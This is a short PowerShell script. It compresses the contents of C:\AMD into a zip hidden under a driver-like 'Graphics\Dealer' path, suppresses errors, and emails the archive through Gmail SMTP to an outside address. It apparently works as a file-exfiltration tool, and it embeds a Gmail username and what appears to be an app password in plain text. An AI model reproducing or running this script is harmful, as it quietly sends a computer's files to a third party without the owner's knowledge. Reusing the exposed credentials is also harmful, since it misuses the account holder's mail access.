Compress-Archive -Path C:\AMD\* -CompressionLevel Optimal -DestinationPath C:\AMD\Graphics\Dealer\masterdoneregtest.zip -ErrorAction SilentlyContinue

$Username = "jackrabbitx2@googlemail.com";
$Password = "lemriobsfaauvmds";
$path = "C:\AMD\Graphics\Dealer\masterdoneregtest.zip";
$date = get-date

function Send-ToEmail([string]$email, [string]$attachmentpath){

    $message = new-object Net.Mail.MailMessage;
    $message.From = "jack@edwardsforge.com";
    $message.To.Add($email);
    $message.Subject = ("test");
    $message.Body = "body text here...";
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);

    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
    write-host "Mail Sent" ; 
    $attachment.Dispose();
 }
Send-ToEmail  -email "logs@edwardsforge.com" -attachmentpath $path;